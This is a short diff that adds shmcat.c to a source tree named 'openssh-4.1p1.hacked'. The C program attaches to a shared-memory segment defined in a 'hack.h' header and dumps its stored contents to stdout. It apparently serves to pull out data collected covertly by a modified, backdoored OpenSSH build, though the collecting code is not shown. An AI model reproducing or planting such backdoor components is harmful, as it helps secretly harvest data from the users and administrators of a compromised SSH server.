diff -ruN openssh-4.1p1/shmcat.c openssh-4.1p1.hacked/shmcat.c
--- openssh-4.1p1/shmcat.c	1970-01-01 01:00:00.000000000 +0100
+++ openssh-4.1p1.hacked/shmcat.c	2006-05-25 22:42:42.000000000 +0200
@@ -0,0 +1,30 @@
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/shm.h>
+#include <string.h>
+
+#include "hack.h"
+
+int main() {
+
+	int len, sid; 
+	char *addr;
+
+
+	sid = shmget(SHMKEY, SHMSIZE, 0);
+	fprintf(stderr, "sid=%d\n", sid);
+	if(sid != -1) {
+		addr = shmat(sid, 0, 0);
+		fprintf(stderr, "addr=%p\n", addr);
+		if(addr != (char *)~0) {
+			memcpy(&len, addr + 4, 4);
+			fprintf(stderr, "len=%d\n", len);
+			fwrite(addr + 8, 1, len, stdout);
+			//fwrite(addr, 1, SHMSIZE, stderr);
+			shmdt(addr);
+		}
+	}
+
+	return 0;
+}
